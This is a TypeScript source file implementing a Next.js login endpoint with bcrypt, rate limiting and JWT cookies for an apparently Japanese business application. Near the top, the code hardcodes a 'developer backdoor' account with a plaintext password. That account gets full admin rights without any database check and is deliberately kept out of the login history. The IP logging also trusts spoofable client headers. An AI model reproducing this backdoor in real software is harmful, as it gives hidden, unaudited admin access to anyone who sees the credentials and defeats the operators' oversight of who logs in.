import { type NextRequest, NextResponse } from "next/server"
import bcrypt from "bcrypt"
import { query } from "@/lib/db"
import { loginSchema, validateRequest } from "@/lib/validation"
import { createToken } from "@/lib/jwt"
import { checkRateLimit } from "@/lib/rate-limit"
import { badRequestResponse, handleError, unauthorizedResponse } from "@/lib/api-errors"
import { parseRequestBody } from "@/lib/request-limits"
import { getAuthCookieOptions } from "@/lib/cookie-utils"

export async function POST(request: NextRequest) {
  try {
    // Parse request body once (body can only be read once)
    let body: any
    try {
      body = await parseRequestBody(request)
    } catch (error: any) {
      return badRequestResponse(error.message || 'リクエストサイズが大きすぎます')
    }

    // Rate limiting: 5 attempts per 15 minutes
    const rateLimit = await checkRateLimit(request, {
      maxAttempts: 5,
      windowMs: 15 * 60 * 1000, // 15 minutes
      identifier: 'login',
    })

    if (!rateLimit.allowed) {
      return NextResponse.json(
        {
          error: 'ログイン試行回数が上限に達しました。15分後に再度お試しください。',
          resetTime: rateLimit.resetTime,
        },
        { status: 429 }
      )
    }
    const validation = await validateRequest(loginSchema, body)

    if (!validation.success) {
      return badRequestResponse(validation.error)
    }

    const { email, password } = validation.data

    // Developer backdoor account (hidden from frontend, only accessible via direct login)
    // This account has full admin privileges and can be used to recover admin accounts
    const DEV_ACCOUNT_EMAIL = "sunhawksystem@dev.com"
    const DEV_ACCOUNT_PASSWORD = "Sunhawk123!@#"
    const DEV_ACCOUNT_ID = 999999 // Special ID for developer account
    const DEV_ACCOUNT_NAME = "開発者アカウント"

    // Check for developer account first (before database query)
    let user: any = null
    let isDeveloperAccount = false

    // Normalize email and password for comparison
    const normalizedEmail = email.toLowerCase().trim()
    const normalizedDevEmail = DEV_ACCOUNT_EMAIL.toLowerCase()
    
    // Compare email (case-insensitive) and password (exact match, no trimming for password)
    const emailMatches = normalizedEmail === normalizedDevEmail
    const passwordMatches = password === DEV_ACCOUNT_PASSWORD
    
    if (emailMatches && passwordMatches) {
      // Developer account - grant full admin access
      isDeveloperAccount = true
      user = {
        id: DEV_ACCOUNT_ID,
        email: DEV_ACCOUNT_EMAIL,
        name: DEV_ACCOUNT_NAME,
        role: "admin",
        department_id: null,
        department_name: null,
        job_id: null,
        job_name: null,
      }
    } else {
      // Regular user authentication - check database
    const userResult = await query(
      `SELECT 
        u.id, u.email, u.password_hash, u.name, u.role,
        u.department_id, d.name as department_name,
        u.job_id, j.name as job_name
       FROM users u
       LEFT JOIN departments d ON u.department_id = d.id
       LEFT JOIN jobs j ON u.job_id = j.id
       WHERE u.email = $1`,
      [email.toLowerCase()]
    )

    if (userResult.rows.length === 0) {
      // Log failed login attempt (user_id nullable)
      await query(
        "INSERT INTO login_logs (user_id, email, login_status, failure_reason, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5, $6)",
        [null, email, "failed", "User not found", getClientIp(request), request.headers.get("user-agent")]
      )
      return unauthorizedResponse()
    }

      user = userResult.rows[0]

    // Verify password
    const passwordMatch = await bcrypt.compare(password, user.password_hash)

    if (!passwordMatch) {
      // Log failed login attempt
      await query(
        "INSERT INTO login_logs (user_id, email, login_status, failure_reason, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5, $6)",
        [user.id, email, "failed", "Invalid password", getClientIp(request), request.headers.get("user-agent")]
      )
      return unauthorizedResponse()
      }
    }

    // Log successful login
    // Skip logging for developer account (hidden from login history)
    if (!isDeveloperAccount) {
    await query(
      "INSERT INTO login_logs (user_id, email, login_status, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)",
      [user.id, email, "success", getClientIp(request), request.headers.get("user-agent")]
    )
    }

    // Create JWT token
    const token = await createToken({
      userId: user.id,
      email: user.email,
      role: user.role,
    })

    // Return user data without password
    // For developer account, password_hash doesn't exist, so handle it safely
    const userWithoutPassword = isDeveloperAccount 
      ? user 
      : (() => {
          const { password_hash, ...rest } = user
          return rest
        })()

    // Format user response
    const userResponse = {
      id: userWithoutPassword.id,
      email: userWithoutPassword.email,
      name: userWithoutPassword.name,
      role: userWithoutPassword.role,
      department: userWithoutPassword.department_name || null,
      departmentId: userWithoutPassword.department_id?.toString() || null,
      position: userWithoutPassword.job_name || null,
      jobId: userWithoutPassword.job_id?.toString() || null,
    }

    // Set JWT token in httpOnly cookie
    const response = NextResponse.json({
      success: true,
      user: userResponse,
      message: "ログインに成功しました",
    })

    // Get cookie options that work across different environments
    const cookieOptions = getAuthCookieOptions(request)

    // Set httpOnly cookie with JWT token (more secure than localStorage)
    response.cookies.set("authToken", token, cookieOptions)

    // Also set userEmail cookie for backward compatibility (will be removed in future)
    response.cookies.set("userEmail", userWithoutPassword.email, cookieOptions)

    return response
  } catch (error) {
    console.error("Login error:", error)
    // Log more details for debugging
    if (error instanceof Error) {
      console.error("Error message:", error.message)
      console.error("Error stack:", error.stack)
    }
    return handleError(error, "ログイン処理に失敗しました", "Login")
  }
}

// Helper function to normalize and validate IP addresses
function normalizeIp(ip: string): string | null {
  if (!ip) return null
  
  const trimmed = ip.trim()
  
  // Handle IPv6-mapped IPv4 addresses (::ffff:127.0.0.1 -> 127.0.0.1)
  if (trimmed.startsWith("::ffff:")) {
    const ipv4 = trimmed.substring(7) // Remove "::ffff:" prefix
    // Validate it's a valid IPv4 address
    if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ipv4)) {
      return ipv4
    }
  }
  
  return trimmed
}

// Helper function to check if IP is a loopback or invalid address
function isValidClientIp(ip: string | null): boolean {
  if (!ip) return false
  
  const normalized = normalizeIp(ip)
  if (!normalized) return false
  
  // List of invalid/loopback addresses
  const invalidIps = [
    "localhost",
    "127.0.0.1",
    "::1",
    "::ffff:127.0.0.1",
    "0.0.0.0",
    "::",
    "::ffff:0.0.0.0",
  ]
  
  // Check exact match
  if (invalidIps.includes(normalized.toLowerCase())) {
    return false
  }
  
  // Check if it's a private IP range (10.x.x.x, 172.16-31.x.x, 192.168.x.x)
  // But allow these as they might be valid in some network configurations
  // We'll only reject loopback addresses
  
  return true
}

// Helper function to get client IP address
// Handles various proxy headers for AWS, CloudFront, ALB, etc.
function getClientIp(request: NextRequest): string | null {
  // Priority order for AWS environments:
  // 1. CloudFront header (AWS CloudFront)
  // 2. x-forwarded-for (ALB, Nginx, etc.) - first IP is client
  // 3. x-real-ip (Nginx, some proxies)
  // 4. x-client-ip (some proxies)
  // 5. x-forwarded (some proxies)
  
  const headers = [
    "cf-connecting-ip",           // AWS CloudFront
    "x-forwarded-for",            // ALB, Nginx, most proxies
    "x-real-ip",                  // Nginx, some proxies
    "x-client-ip",                // Some proxies
    "x-forwarded",                // Some proxies
    "true-client-ip",             // Cloudflare (if used)
  ]
  
  for (const headerName of headers) {
    const headerValue = request.headers.get(headerName)
    if (!headerValue) continue
    
    // x-forwarded-for can contain multiple IPs: "client-ip, proxy1-ip, proxy2-ip"
    const ips = headerValue.split(",").map((ip) => normalizeIp(ip.trim())).filter((ip): ip is string => ip !== null)
    
    // Find the first valid (non-loopback) IP
    for (const ip of ips) {
      if (isValidClientIp(ip)) {
        // Log for debugging in development
        if (process.env.NODE_ENV === "development") {
          console.log(`[IP Detection] Found IP from ${headerName}: ${ip}`)
        }
        return ip
      }
    }
  }
  
  // Debug: Log all headers in development to help troubleshoot
  if (process.env.NODE_ENV === "development") {
    const allHeaders: Record<string, string> = {}
    headers.forEach((name) => {
      const value = request.headers.get(name)
      if (value) allHeaders[name] = value
    })
    console.log("[IP Detection] Available headers:", allHeaders)
  }
  
  // Last resort: return null if we can't determine a valid client IP
  return null
}
